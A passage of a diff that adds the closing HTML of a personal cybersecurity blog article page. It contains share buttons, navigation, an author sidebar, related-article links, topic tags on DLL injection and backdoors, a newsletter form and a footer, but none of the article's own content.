+          <div class="social-share" role="complementary" aria-label="Share this article">
+            <span class="share-label">Share:</span>
+            <button id="share-twitter" class="share-btn twitter" aria-label="Share on Twitter/X">
+              <i class="fa-brands fa-x-twitter" aria-hidden="true"></i>
+            </button>
+            <button id="share-linkedin" class="share-btn linkedin" aria-label="Share on LinkedIn">
+              <i class="fa-brands fa-linkedin-in" aria-hidden="true"></i>
+            </button>
+            <button id="share-copy-url" class="share-btn copy-url" aria-label="Copy link">
+              <i class="fa-solid fa-link" aria-hidden="true"></i>
+            </button>
+          </div>
+
+          <!-- Article Navigation -->
+          <nav class="article-nav" aria-label="Article navigation">
+            <a href="../blog.html" class="article-nav-link prev">
+              <div class="article-nav-dir"><i class="fa-solid fa-arrow-left fa-xs" aria-hidden="true"></i> Back to Blog</div>
+              <div class="article-nav-title">All Articles</div>
+            </a>
+            <a href="metasploitable-complete-guide.html" class="article-nav-link next">
+              <div class="article-nav-dir">Next Article <i class="fa-solid fa-arrow-right fa-xs" aria-hidden="true"></i></div>
+              <div class="article-nav-title">Metasploitable 2: The Ultimate Beginner's Guide</div>
+            </a>
+          </nav>
+
+          <!-- Comments Placeholder -->
+          <div class="comments-wrap">
+            <div class="comments-icon" aria-hidden="true"><i class="fa-regular fa-comments"></i></div>
+            <h3 class="comments-title">Discussion</h3>
+            <p class="comments-desc">Comments coming soon. For now, reach out on <a href="https://linkedin.com/in/aimadulislam" target="_blank" rel="noopener">LinkedIn</a> or <a href="mailto:info@aimadulislam.dpdns.org">email me</a> with questions.</p>
+          </div>
+
+        </article>
+
+        <!-- Article Sidebar -->
+        <aside class="sidebar" aria-label="Article sidebar">
+
+          <!-- Author -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-user" aria-hidden="true"></i> Author</div>
+            <div style="display:flex;gap:0.85rem;align-items:center;margin-bottom:0.85rem;">
+              <img src="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"
+                   alt="Aimad Ul Islam"
+                   style="width:50px;height:50px;border-radius:50%;object-fit:cover;border:2px solid var(--border2);"
+                   loading="lazy"
+                   onerror="this.src='https://ui-avatars.com/api/?name=Aimad&background=0A1628&color=00D4FF&size=50'"/>
+              <div>
+                <div style="font-family:'Space Grotesk',sans-serif;font-size:0.9rem;font-weight:600;">Aimad Ul Islam</div>
+                <div style="font-family:'JetBrains Mono',monospace;font-size:0.62rem;color:var(--muted);">Ethical Hacker | DFIR</div>
+              </div>
+            </div>
+            <p style="color:var(--muted);font-size:0.78rem;line-height:1.6;margin-bottom:0.85rem;">Cisco Ethical Hacker Certified. Blue Cape DFIR Certified. BSc CS, University of Peshawar.</p>
+            <a href="../index.html" class="btn btn-outline" style="width:100%;justify-content:center;font-size:0.68rem;">View Portfolio</a>
+          </div>
+
+          <!-- Related Articles -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-layer-group" aria-hidden="true"></i> Related Articles</div>
+            <a href="python-for-security.html" class="sidebar-post">
+              <div class="sidebar-post-thumb">🐍</div>
+              <div>
+                <div class="sidebar-post-title">Python for Hackers: Security Automation</div>
+                <div class="sidebar-post-meta">14 min · Programming</div>
+              </div>
+            </a>
+            <a href="metasploitable-complete-guide.html" class="sidebar-post">
+              <div class="sidebar-post-thumb">🎯</div>
+              <div>
+                <div class="sidebar-post-title">Metasploitable 2: Ultimate Beginner's Guide</div>
+                <div class="sidebar-post-meta">20 min · Cybersecurity</div>
+              </div>
+            </a>
+            <a href="home-lab-setup.html" class="sidebar-post">
+              <div class="sidebar-post-thumb">🏠</div>
+              <div>
+                <div class="sidebar-post-title">Home Lab on a Budget</div>
+                <div class="sidebar-post-meta">10 min · Tutorials</div>
+              </div>
+            </a>
+          </div>
+
+          <!-- Tags -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-tags" aria-hidden="true"></i> Tags</div>
+            <div class="tags-cloud">
+              <span class="tag tag-prog">python</span>
+              <span class="tag tag-tut">dll-injection</span>
+              <span class="tag tag-tut">code-injection</span>
+              <span class="tag tag-cyber">backdoor</span>
+              <span class="tag tag-cyber">penetration-testing</span>
+            </div>
+          </div>
+
+          <!-- Newsletter -->
+          <div class="sidebar-widget card">
+            <div class="card-glow"></div>
+            <div class="widget-title"><i class="fa-solid fa-envelope" aria-hidden="true"></i> Newsletter</div>
+            <p style="color:var(--muted);font-size:0.78rem;line-height:1.6;margin-bottom:1rem;">Get new posts delivered to your inbox.</p>
+            <form class="newsletter-form newsletter-form-handler" novalidate>
+              <input type="email" class="newsletter-input" placeholder="your@email.com" aria-label="Email address" required/>
+              <button type="submit" class="newsletter-btn">Subscribe</button>
+              <p class="newsletter-note">No spam · Free forever</p>
+            </form>
+          </div>
+
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- Footer -->
+<footer class="blog-footer" role="contentinfo">
+  <div class="container">
+    <div class="footer-grid">
+      <div>
+        <div class="footer-brand">[Aimad<span>.</span>Blog]</div>
+        <p class="footer-tagline">Cybersecurity student from Peshawar documenting his learning journey — one post at a time.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Blog</h4>
+        <a href="../blog.html">All Posts</a>
+        <a href="../blog.html?cat=Cybersecurity">Cybersecurity</a>
+        <a href="../blog.html?cat=Linux">Linux</a>
+        <a href="../blog.html?cat=Tutorials">Tutorials</a>
+      </div>
+      <div class="footer-col">
+        <h4>Connect</h4>
+        <a href="https://linkedin.com/in/aimadulislam" target="_blank" rel="noopener"><i class="fa-brands fa-linkedin-in fa-xs"></i> LinkedIn</a>
+        <a href="https://github.com/Aimadulislam" target="_blank" rel="noopener"><i class="fa-brands fa-github fa-xs"></i> GitHub</a>
+        <a href="mailto:info@aimadulislam.dpdns.org"><i class="fa-solid fa-envelope fa-xs"></i> Email</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span class="footer-copy">© 2026 Aimad Ul Islam</span>
+      <div class="footer-socs">
+        <a href="https://linkedin.com/in/aimadulislam" target="_blank" rel="noopener" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
+        <a href="https://github.com/Aimadulislam" target="_blank" rel="noopener" aria-label="GitHub"><i class="fa-brands fa-github"></i></a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<!-- Scroll to Top -->
+<button id="scroll-top" aria-label="Scroll to top"><i class="fa-solid fa-chevron-up fa-xs" aria-hidden="true"></i></button>
+
+<script src="../js/blog.js"></script>
+</body>
+</html>
